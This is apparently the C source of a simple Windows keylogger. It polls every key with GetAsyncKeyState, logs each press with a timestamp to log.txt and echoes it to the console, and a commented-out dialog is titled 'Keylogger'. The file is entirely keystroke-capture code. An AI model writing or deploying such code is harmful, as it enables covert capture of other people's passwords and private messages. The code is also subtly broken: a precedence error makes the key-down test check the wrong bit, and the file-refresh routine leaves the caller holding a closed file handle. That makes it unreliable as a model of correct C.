#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Winuser.h>
#include <time.h>
#include "header.h"

void checkKeyboard(FILE* fp, int flag, int inKeys[NUMKEYS], char outKeys[NUMKEYS][KEYLETTERS], char shiftedKeys[SHIFTKEYS][KEYLETTERS]) {
    int i;
    for (i = 0; i < NUMKEYS; i++) {
        int checkShift = GetAsyncKeyState(0x10);
        if (checkShift & (0x8000 != 0)) {
            shiftPrint(fp);
        }
        int checkKey = GetAsyncKeyState(inKeys[i]) & (0x8000 != 0);
        if (checkKey) {
            nonShiftPrint(fp, checkShift, flag, i, outKeys, shiftedKeys);
        }
    }
    Sleep(20);
}

void nonShiftPrint(FILE* fp, int checkShift, int flag, int counter, char outKeys[NUMKEYS][KEYLETTERS], char shiftedKeys[SHIFTKEYS][KEYLETTERS]) {
    if (flag != 0) {
        if (checkShift != 0 && counter < SHIFTKEYS) {
            printTime(fp);
            printf("'%s' \n", shiftedKeys[counter]);
            fprintf(fp, "'%s' \n", shiftedKeys[counter]);
        } else {
            printTime(fp);
            printf("'%s' \n", outKeys[counter]);
            fprintf(fp, "'%s' \n", outKeys[counter]);
        }
    }
}

void shiftPrint(FILE* fp) {
    printTime(fp);
    printf("'shift' \n");
    fprintf(fp, "'shift' \n");
}

void printTime(FILE* fp) {
    time_t t;
    time(&t);
    char timeString[30];
    strncpy (timeString, ctime(&t), 19);
    timeString[19] = '\0';
    printf("[%s]: ", timeString);
    fprintf(fp, "[%s]: ", timeString);
}

FILE* openFile() {
    FILE* fp;
    if ((fp = fopen("log.txt", "a+")) == NULL) {
        printf("Error! opening file");
        exit(1);
    }
    return(fp);
}

void updateFile(int *timerPtr, FILE* fp) {
    if (*timerPtr == 500) {
        *timerPtr = 0;
        /*MessageBox(0, "Updated File!", "  Keylogger", MB_OK);*/
        fclose(fp);
        fp = openFile();
    } else {
        (*timerPtr)++;
    }
}